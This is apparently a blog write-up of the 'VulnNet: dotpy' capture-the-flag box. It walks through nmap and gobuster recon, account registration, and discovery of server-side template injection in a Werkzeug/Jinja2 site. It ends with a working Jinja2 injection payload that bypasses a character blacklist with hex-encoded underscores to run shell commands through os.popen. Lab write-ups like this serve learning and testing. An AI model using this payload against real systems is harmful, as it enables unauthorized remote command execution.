---
layout: post
title:  "VulnNet: dotpy"
date:   2022-03-01 16:18:00 +0000
tags: python
---

## [0x01] Outline

![Subscribe](/assets/img/vulnnet_dotpy/icon.png){: w="100" .left}

VulnNet: dotpy is a medium difficulty box with a focus on `python`.


## [0x02] Recon


### nmap

Running nmap we find port `8080` open

```bash
nmap -sC -sV -oA nmap/scan -p- -v 10.10.132.101

---snip---
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.132.101:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
---snip---
```
### website
Browsing to `http://10.10.132.101:8080` we're greeted with a login / sign up form. Many of the links are Anchors that lead nowhere.
Since we know the page is loading we can run our `gobuster` scans, and we'll need to add `-b 403` to force the scan.

![Subscribe](/assets/img/vulnnet_dotpy/01.png){: w="300" .left}

### gobuster
```bash
gobuster dir -u http://10.10.132.101:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o main.gobuster -b 403

cat main.gobuster 
/login                (Status: 200) [Size: 5589]
/register             (Status: 200) [Size: 5021]
/logout               (Status: 302) [Size: 219] [--> http://10.10.132.101:8080/login]
```


### purse
While our scan is running we'll quickly clone the site and check with `pursue`, but there isn't anything of note here.

```bash
wget -rkpN -e robots=off http://10.10.132.101:8080
pursue --query | sort -u
pursue --domain | sort -u
pursue --endpoints | sort -u
```

### Register and Login

Clicking the `Create New Account` takes us to a `/register` page. We'll use `admin`, `admin@admin.com` and password of `admin`, we're prompted to log in.

Once logged in we see an application dashboard we oddly have a user profile picture and the name of `Staradmin`.  It's possible that using `admin` as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?

![Dashboard](/assets/img/vulnnet_dotpy/02.png){: w="300" .left}

### Walking the site

Most of the links are only Anchor tags so are a dead end.  This took me about 2 hours to find a vulnerability, I tried clicking every button and downloading every file and page I could find.


### SSTI

After trying for an `LFI` at `http://10.10.132.101:8080/etc/passwd` you can see that the path `/etc/passwd` is reflected in the page.
Since our `nmap` banner grab says this site is running `Werkzeug` we can try `Server Side Template Injection (SSTI)`

![404](/assets/img/vulnnet_dotpy/03.png){: w="600" .left}

Trying to go to the path `http://10.10.132.101:8080/{{ 7 * 7 }}` shows the answer `49`.

[HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) examples for other engines are below; 
- {{7*7}}
- ${7*7}
- <%= 7*7 %>
- ${{7*7}}
- #{7*7}

![404](/assets/img/vulnnet_dotpy/04.png){: w="600" .left}

Navigating to `http://10.10.132.101:8080/{{config}}` lists all the config items from with in the Python web server, but we're unable to use a full stops / period `.` in our query as there is some sort of blacklist being checked. After some testing we're unable to use `.`, `_`, `[`, `]`, if we do, we get redirected to a `403` blocked page error. 

## Research

After about a days research I came across this post [https://gusralph.info/jinja2-ssti-research/](https://gusralph.info/jinja2-ssti-research/) that goes in the depths on how a `Web Application Firewall (WAF)` might block certain characters and how to bypass the filter with encoding.

It would seam that this box is using the methods detailed in this paper as its inspiration.  The answer is given to us, but I took another few hours to dive into the topic to understand what is happening and how this works. In real PenTests and Bug Bounty situations the answer may need adjustments made.

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
